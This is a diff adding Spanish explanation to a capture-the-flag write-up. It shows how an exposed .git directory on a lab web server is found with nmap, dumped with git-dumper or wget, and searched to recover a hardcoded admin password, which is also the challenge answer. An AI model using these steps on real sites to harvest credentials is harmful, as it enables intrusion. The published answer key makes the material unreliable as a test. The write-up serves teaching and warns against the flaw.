@@ -17,6 +17,55 @@
 
 ### Task 1: Find the Super Secret Password
 
+**Explicación:** El escaneo de nmap descubre un repositorio git expuesto en `/.git/`:
+
+```
+nmap -sC -sV MACHINE_IP
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+| http-git:
+|   10.10.201.254:80/.git/
+|     Git repository found!
+|_http-title: Super Awesome Site!
+```
+
+Descargar el repositorio `.git` completo con git-dumper o wget recursivo:
+
+```
+/opt/git-dumper/git-dumper.py http://MACHINE_IP:80/.git/ ./git_files
+# o
+wget http://MACHINE_IP/.git/ --recursive --no-parent
+```
+
+`git log` revela dos commits:
+
+```
+commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
+    Update .gitlab-ci.yml
+
+commit 395e087334d613d5e423cdf8f7be27196a360459
+    Made the login page, boss!
+```
+
+El commit `395e087` ("Made the login page, boss!") contiene el código de la página de login **antes** de que se ofuscara. Ver el diff:
+
+```
+git show 395e087334d613d5e423cdf8f7be27196a360459
+```
+
+En el `index.html` se encuentran las credenciales en texto claro:
+
+```javascript
+if (
+  username === "admin" &&
+  password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+) {
+  document.cookie = "login=1";
+  window.location.href = "/dashboard.html";
+}
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Find the Super Secret Password | `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!` |
@@ -30,6 +79,8 @@
 4. **Foothold:** `git show 395e087334d613d5e423cdf8f7be27196a360459` muestra el `index.html` con las credenciales en texto claro: `username === "admin"` y `password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"`; la contraseña se puede usar como flag o para autenticarse (cookie `login=1`).
 
 **Learning chain:** nmap (http-git) → repositorio .git expuesto → git-dumper/wget descarga → git log → commit "Made the login page, boss!" → git show → credenciales en texto claro en el diff → flag.
+
+**Lección:** nunca exponer el directorio `.git` públicamente; los commits anteriores pueden contener secretos que se creían eliminados.
 
 **MITRE ATT&CK:** T1005 (Data from Local System), T1552.001 (Unsecured Credentials: Credentials in Files).
 
